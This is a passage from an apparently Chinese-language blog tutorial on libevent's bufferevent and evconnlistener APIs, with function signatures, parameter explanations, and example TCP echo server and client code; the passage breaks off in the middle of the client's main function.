成功创建的bufferevent事件对象</span><br></pre></td></tr></table></figure><p>释放<code>bufferevent</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bufferevent_free</span><span class="params">(struct bufferevent *bev)</span></span></span><br></pre></td></tr></table></figure><h4 id="给读写缓冲区设置回调"><a href="#给读写缓冲区设置回调" class="headerlink" title="给读写缓冲区设置回调"></a>给读写缓冲区设置回调</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bufferevent_setcb</span><span class="params">(struct bufferevent *bufev,bufferevent_data_cb readcb,bufferevent_data_cb writecb,bufferevent_event_cb eventcb,<span class="keyword">void</span> *cbarg)</span></span>;</span><br><span class="line"></span><br><span class="line">bufev: bufferevent_socket_new()函数的返回值</span><br><span class="line">readcb:读缓冲对应的回调，自己封装，在其内部读数据</span><br><span class="line">  writecb:设置bufferevent写缓冲 不用，传<span class="literal">NULL</span></span><br><span class="line">  eventcb: 设置事件回调。可传<span class="literal">NULL</span></span><br><span class="line">  cbarg: 回调函数用的参数</span><br></pre></td></tr></table></figure><h5 id="readcb对应的回调函数"><a href="#readcb对应的回调函数" class="headerlink" title="readcb对应的回调函数"></a>readcb对应的回调函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*bufferevent_data_cb)</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *ctx)</span></span>;</span><br></pre></td></tr></table></figure><p>例如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span>&#123;</span><br><span class="line">  ....</span><br><span class="line">  bufferevent_read();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">bufferevent_read</span><span class="params">(struct bufferevent *bufev,<span class="keyword">void</span> *data,<span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line"><span class="comment">//通常用在readcb中，代替read()</span></span><br></pre></td></tr></table></figure><h5 id="writecb对应的回调函数"><a href="#writecb对应的回调函数" class="headerlink" title="writecb对应的回调函数"></a>writecb对应的回调函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span>&#123;</span><br><span class="line">  ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bufferevent_write</span><span class="params">(struct bufferevent *bufev,<span class="keyword">const</span> <span class="keyword">void</span> *data,<span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line"><span class="comment">//常用在bufferevent_read之后，代替write()</span></span><br></pre></td></tr></table></figure><h5 id="eventcb对应的回调函数"><a href="#eventcb对应的回调函数" class="headerlink" title="eventcb对应的回调函数"></a>eventcb对应的回调函数</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*bufferevent_event_cb)</span><span class="params">(struct bufferevent *bev,short events,<span class="keyword">void</span> *ctx)</span></span>;</span><br><span class="line"></span><br><span class="line">events: 不同标志位，代表不同的事件</span><br><span class="line">  BEV_EVENT_READING: 读取操作时发生某事件，具体是哪种事件，看其他标志</span><br><span class="line">  BEV_EVENT_WRITING: 写入操作时发生某事件，具体是哪种事件，看其他标志</span><br><span class="line">  BEV_EVENT_ERROR: 操作时发生错误</span><br><span class="line">  BEV_EVENT_TIMEOUT: 发生超时</span><br><span class="line">  BEV_EVENT_EOF: 遇到文件结束指示</span><br><span class="line">  BEV_EVENT_CONNECTED: 请求的连接过程已经完成，实现客户端时可用</span><br></pre></td></tr></table></figure><h4 id="禁用和启用缓冲区"><a href="#禁用和启用缓冲区" class="headerlink" title="禁用和启用缓冲区"></a>禁用和启用缓冲区</h4><p>默认：新建的<code>bufferevent</code>写缓冲时<code>enable</code>的，而读缓冲是<code>disable</code>的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bufferevent_enable</span><span class="params">(struct bufferevent *bufev,short events)</span></span>;</span><br><span class="line"><span class="comment">//通常用来启用bufferevent的read缓冲</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bufferevent_disable</span><span class="params">(struct bufferevent *bufev,short events)</span></span>; <span class="comment">//禁用</span></span><br><span class="line"></span><br><span class="line">events: EV_READ、EV_WRITE、EV_READ｜EV_WRITE</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">short <span class="title">bufferevent_get_enabled</span><span class="params">(struct bufferevent *bufev)</span></span>;</span><br><span class="line"><span class="comment">//获取缓冲区的禁用状态，需要借助&amp;来得到</span></span><br></pre></td></tr></table></figure><h4 id="客户端连接服务器"><a href="#客户端连接服务器" class="headerlink" title="客户端连接服务器"></a>客户端连接服务器</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bufferevent_socket_connect</span><span class="params">(struct bufferevent *bev,struct sockaddr *address,<span class="keyword">int</span> addrlen)</span></span>;</span><br><span class="line"></span><br><span class="line">bev: bufferevent事件对象(封装了fd)</span><br><span class="line">  address: 地址结构</span><br><span class="line">  addrlen: 地址长度</span><br></pre></td></tr></table></figure><h4 id="服务器创建监听器"><a href="#服务器创建监听器" class="headerlink" title="服务器创建监听器"></a>服务器创建监听器</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/listener.h&gt;</span></span></span><br><span class="line"><span class="function">struct evconnlistener * <span class="title">evconnlistener_new</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">struct event_base *base,</span></span></span><br><span class="line"><span class="function"><span class="params">  evconnlistener_cb cb,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">unsigned</span> flags,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> backlog,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">evutil_socket_t</span> fd</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evconnlistener</span> *<span class="title">listener</span></span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">evconnlistener</span> *<span class="title">evconnlistener_new_bind</span>(</span></span><br><span class="line"><span class="class"><span class="title">struct</span> <span class="title">event_base</span> *<span class="title">base</span>,</span></span><br><span class="line"><span class="class">  <span class="title">evconnlistener_cb</span> <span class="title">cb</span>,</span></span><br><span class="line"><span class="class">  <span class="title">void</span> *<span class="title">ptr</span>,</span></span><br><span class="line"><span class="class">  <span class="title">unsigned</span> <span class="title">flags</span>,</span></span><br><span class="line"><span class="class">  <span class="title">int</span> <span class="title">backlog</span>,</span></span><br><span class="line"><span class="class">  <span class="title">const</span> <span class="title">struct</span> <span class="title">sockaddr</span> *<span class="title">sa</span>,</span></span><br><span class="line"><span class="class">  <span class="title">int</span> <span class="title">socklen</span></span></span><br><span class="line"><span class="class">);</span></span><br><span class="line"></span><br><span class="line">cb: 监听回调函数，接受连接之后用户要做的操作</span><br><span class="line">  ptr: 回调函数的参数</span><br><span class="line">flags: “可识别的标志”</span><br><span class="line">    LEV_OPT_CLOSE_ON_FREE: 释放bufferevent时关闭底层传输端口，这将关闭底层套接字，释放底层bufferevent</span><br><span class="line">    LEV_OPT_REUSEABLE: 端口复用，可以<span class="string">"|"</span></span><br><span class="line">  backlog: listen()函数的第二个参数，传<span class="number">-1</span>表示使用默认最大值</span><br><span class="line">  sa: 服务器自己的地址结构体，IP+Port</span><br><span class="line">  socklen: 服务器自己的地址结构体大小</span><br><span class="line"></span><br><span class="line">返回值: 成功创建的监听器</span><br></pre></td></tr></table></figure><h5 id="回调函数类型"><a href="#回调函数类型" class="headerlink" title="回调函数类型"></a>回调函数类型</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span><span class="params">(*evconnlistener_cb)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">struct evconnlistener *listener,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">evutil_socket_t</span> sock,</span></span></span><br><span class="line"><span class="function"><span class="params">  struct sockaddr *addr,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span> len,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">void</span> *ptr</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line">listener: evconnlistener_new_bind函数的返回值</span><br><span class="line">sock: 用于通信的文件描述符</span><br><span class="line">addr: 客户端的IP+端口</span><br><span class="line">len: addr的len</span><br><span class="line">ptr: 外部ptr传递进来的值</span><br></pre></td></tr></table></figure><h4 id="释放监听服务器"><a href="#释放监听服务器" class="headerlink" title="释放监听服务器"></a>释放监听服务器</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evconnlistener_free(listener);</span><br></pre></td></tr></table></figure><h4 id="服务端bufferevent创建TCP连接流程"><a href="#服务端bufferevent创建TCP连接流程" class="headerlink" title="服务端bufferevent创建TCP连接流程"></a>服务端bufferevent创建TCP连接流程</h4><ul><li>创建<code>event_base</code></li><li>创建服务器连接监听器<code>evconnlistener_new_bind()</code></li><li>在<code>evconnlistener_new_bind()</code>的回调函数中，处理接受连接后的操作</li><li>回调函数被调用，说明有一个新的客户端连接，会得到一个新的fd，用于和客户端进行通信</li><li>创建<code>bufferevent</code>事件对象，<code>bufferevent_socket_new()</code>，将fd封装到这个事件对象中</li><li>使用<code>bufferevent_setcb()</code>函数给<code>bufferevent</code>的<code>read、write、event</code>设置回调函数</li><li>设置读缓冲、写缓冲的使能状态 <code>enable、disable</code></li><li>接受、发送数据<code>bufferevent_read()/bufferevent_write()</code></li><li>启动循环<code>event_base_dispatch()</code></li><li>释放资源</li></ul><h4 id="服务端bufferevent实现"><a href="#服务端bufferevent实现" class="headerlink" title="服务端bufferevent实现"></a>服务端bufferevent实现</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/listener.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/bufferevent.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//读缓冲区回调</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">bufferevent_read(bev,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"client say : %s\n"</span>,buf);</span><br><span class="line"><span class="keyword">char</span> *p = <span class="string">"我是服务器，已经成功收到你发送的数据！"</span>;</span><br><span class="line">bufferevent_write(bev,p,<span class="built_in">strlen</span>(p)+<span class="number">1</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写缓冲区回调</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"我是服务器的写回调函数...\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//事件回调</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">event_cb</span><span class="params">(struct bufferevent *bev,short events,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (events &amp; BEV_EVENT_EOF)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"connection close\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(events &amp; BEV_EVENT_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"some other error\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">bufferevent_free(bev);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"buffevent资源已经被释放...\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//监听回调</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cb_listener</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">struct evconnlistener *listener,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">evutil_socket_t</span> fd,</span></span></span><br><span class="line"><span class="function"><span class="params">struct sockaddr *addr,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">int</span> len,<span class="keyword">void</span> *ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"connect new client\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = (<span class="title">struct</span> <span class="title">event_base</span>*)<span class="title">ptr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//添加新事件</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">bev</span>;</span></span><br><span class="line">bev = bufferevent_socket_new(base,fd,BEV_OPT_CLOSE_ON_FREE);</span><br><span class="line"></span><br><span class="line"><span class="comment">//给bufferevent缓冲区设置回调</span></span><br><span class="line">bufferevent_setcb(bev,read_cb,write_cb,event_cb,<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//启用bufferevent的读缓冲</span></span><br><span class="line">bufferevent_enable(bev,EV_READ);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;serv,<span class="number">0</span>,<span class="keyword">sizeof</span>(serv));</span><br><span class="line">serv.sin_family = AF_INET;</span><br><span class="line">serv.sin_port = htons(<span class="number">9527</span>);</span><br><span class="line">serv.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建event_base</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span>;</span></span><br><span class="line">base = event_base_new();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evconnlistener</span> *<span class="title">listener</span>;</span> <span class="comment">//监听器</span></span><br><span class="line"><span class="comment">//创建套接字，绑定，接收连接请求</span></span><br><span class="line">listener = evconnlistener_new_bind(base,cb_listener,base,LEV_OPT_CLOSE_ON_FREE | LEV_OPT_REUSEABLE,<span class="number">36</span>,(struct sockaddr*)&amp;serv,<span class="keyword">sizeof</span>(serv));</span><br><span class="line"></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line">evconnlistener_free(listener);</span><br><span class="line">event_base_free(base);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc ev_server.c -o ev_server -l event</span><br></pre></td></tr></table></figure><h4 id="客户端bufferevent创建TCP连接流程"><a href="#客户端bufferevent创建TCP连接流程" class="headerlink" title="客户端bufferevent创建TCP连接流程"></a>客户端bufferevent创建TCP连接流程</h4><ul><li>创建<code>event_base</code></li><li>使用<code>bufferevent_socket_new()</code>创建一个用于跟服务器通信的<code>bufferevent</code>事件对象</li><li>使用<code>bufferevent_socket_connect()</code>连接服务器</li><li>使用<code>bufferevent_setcb()</code>给<code>bufferevent</code>对象的<code>read、write、event</code>设置回调</li><li>设置<code>bufferevent</code>对象的读写缓冲区<code>enable/disable</code></li><li>接受、发送数据<code>bufferevent_read()/bufferevent_write()</code></li><li>启动循环监听<code>event_base_dispatch()</code></li><li>释放资源</li></ul><h4 id="客户端bufferevent实现"><a href="#客户端bufferevent实现" class="headerlink" title="客户端bufferevent实现"></a>客户端bufferevent实现</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/bufferevent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//读缓冲区回调</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">bufferevent_read(bev,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"server say : %s\n"</span>,buf);</span><br><span class="line">bufferevent_write(bev,buf,<span class="built_in">strlen</span>(buf)+<span class="number">1</span>);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_cb</span><span class="params">(struct bufferevent *bev,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"我是客户端的写回调函数....\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//事件回调</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">event_cb</span><span class="params">(struct bufferevent *bev,short events,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (events &amp; BEV_EVENT_EOF)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"connection close\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(events &amp; BEV_EVENT_ERROR)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"some other error\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(events &amp; BEV_EVENT_CONNECTED)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"已经成功连接到服务器\n"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">bufferevent_free(bev);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"buffevent资源已经被释放...\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_terminal</span><span class="params">(<span class="keyword">evutil_socket_t</span> fd,short what,<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> len = read(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">bev</span> = (<span class="title">struct</span> <span class="title">bufferevent</span>*)<span class="title">arg</span>;</span></span><br><span class="line"><span class="comment">//发送数据</span></span><br><span class="line">bufferevent_write(bev,buf,len+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">NULL</span>;</span></span><br><span class="line">base = event_base_new();</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd = socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//通信的fd放在bufferevent中</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">bev</span> = <span 